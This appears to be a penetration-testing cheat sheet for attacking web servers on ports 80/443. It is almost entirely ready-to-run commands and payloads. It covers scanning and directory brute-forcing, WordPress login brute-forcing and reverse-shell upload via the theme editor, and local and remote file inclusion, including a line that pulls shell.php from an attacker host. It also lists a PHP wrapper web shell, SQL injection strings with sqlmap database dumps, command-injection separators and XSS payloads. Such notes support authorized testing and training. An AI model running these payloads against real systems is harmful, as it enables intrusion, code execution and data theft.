# Port 80/443 - HTTP/HTTPS

## Table of Contents
- [Enumeration](#enumeration)
  - [Banner Grabbing](#banner-grabbing)
  - [Nmap Scripts](#nmap-scripts)
  - [Directory Bruteforce](#directory-bruteforce)
  - [Virtual Host Discovery](#virtual-host-discovery)
  - [Technology Detection](#technology-detection)
- [CMS Scanning](#cms-scanning)
  - [WordPress](#wordpress)
  - [Drupal](#drupal)
  - [Joomla](#joomla)
- [Vulnerability Scanning](#vulnerability-scanning)
- [Web Attacks](#web-attacks)

---

## Enumeration

### Banner Grabbing

```shell
# curl
curl -I http://$rhost
curl -iv http://$rhost

# Netcat
nc -nv $rhost 80
HEAD / HTTP/1.1

# Whatweb
whatweb http://$rhost
```

### Nmap Scripts

```shell
# HTTP enumeration
nmap -p 80,443 -sV --script http-enum $rhost
nmap -p 80,443 --script http-headers $rhost
nmap -p 80,443 --script http-methods $rhost
nmap -p 80,443 --script http-robots.txt $rhost
nmap -p 80,443 --script http-shellshock $rhost

# SSL/TLS
nmap -p 443 --script ssl-enum-ciphers $rhost
nmap -p 443 --script ssl-cert $rhost
nmap -p 443 --script ssl-heartbleed $rhost

# Vulnerability scanning
nmap -p 80,443 --script "vuln" $rhost
```

### Directory Bruteforce

#### gobuster

```shell
# Basic scan
gobuster dir -u http://$rhost -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://$rhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,old

# Ignore SSL errors
gobuster dir -u https://$rhost -w /usr/share/wordlists/dirb/common.txt -k
```

#### ffuf

```shell
# Basic scan
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$rhost/FUZZ

# With extensions
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$rhost/FUZZ -e .php,.txt,.html

# Filter by status code
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$rhost/FUZZ -mc 200,301,302

# Filter by size
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$rhost/FUZZ -fs 1234
```

#### dirsearch

```shell
# Basic scan
python3 dirsearch.py -u http://$rhost -w /usr/share/wordlists/dirb/common.txt

# With extensions
python3 dirsearch.py -u http://$rhost -e php,txt,html
```

### Virtual Host Discovery

```shell
# gobuster
gobuster vhost -u http://$rhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# ffuf
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$domain" -u http://$rhost -ac

# wfuzz
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$domain" -u http://$rhost --hc 400,404
```

### Technology Detection

```shell
# Wappalyzer (browser extension)
# WhatWeb
whatweb http://$rhost -v

# Nikto
nikto -host http://$rhost
```

---

## CMS Scanning

### WordPress

```shell
# WPScan basic
wpscan --url http://$rhost

# Enumerate users, themes, plugins
wpscan --url http://$rhost -e u,t,p

# Aggressive plugin detection
wpscan --url http://$rhost --plugins-detection aggressive

# Brute force login
wpscan --url http://$rhost -U users.txt -P passwords.txt

# With API token
wpscan --url http://$rhost --api-token YOUR_API_TOKEN -e vp,vt,u
```

**WordPress Shell Upload:**
```
1. Login to WordPress admin
2. Appearance -> Theme Editor
3. Edit 404.php with PHP reverse shell
4. Access: http://target/wp-content/themes/theme-name/404.php
```

### Drupal

```shell
# droopescan
droopescan scan drupal -u http://$rhost

# Nmap
nmap -p 80,443 --script http-drupal-enum $rhost
```

### Joomla

```shell
# droopescan
droopescan scan joomla -u http://$rhost

# joomscan
joomscan -u http://$rhost
```

---

## Vulnerability Scanning

### Nikto

```shell
nikto -host http://$rhost -o nikto.txt
```

### Searchsploit

```shell
# Search for web application exploits
searchsploit apache 2.4
searchsploit wordpress
searchsploit drupal
```

---

## Web Attacks

### File Inclusion

```shell
# Local File Inclusion (LFI)
http://$rhost/page.php?file=../../../../../etc/passwd
http://$rhost/page.php?file=....//....//....//etc/passwd

# Remote File Inclusion (RFI)
http://$rhost/page.php?file=http://$lhost/shell.php

# PHP Wrappers
http://$rhost/page.php?file=php://filter/convert.base64-encode/resource=index.php
http://$rhost/page.php?file=data://text/plain,<?php system($_GET['cmd']);?>
```

### SQL Injection

```shell
# Basic test
' OR '1'='1
" OR "1"="1
' OR 1=1--
" OR 1=1--

# SQLMap
sqlmap -u "http://$rhost/page.php?id=1" --batch
sqlmap -u "http://$rhost/page.php?id=1" --dbs
sqlmap -u "http://$rhost/page.php?id=1" -D database --tables
sqlmap -u "http://$rhost/page.php?id=1" -D database -T table --dump

# With POST data
sqlmap -r request.txt --batch
```

### Command Injection

```shell
# Basic payloads
; id
| id
|| id
& id
&& id
$(id)
`id`
```

### XSS

```shell
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

---

## Common Files to Check

```
/robots.txt
/sitemap.xml
/.git/
/.svn/
/.htaccess
/backup/
/admin/
/login/
/phpinfo.php
/server-status
/server-info
```
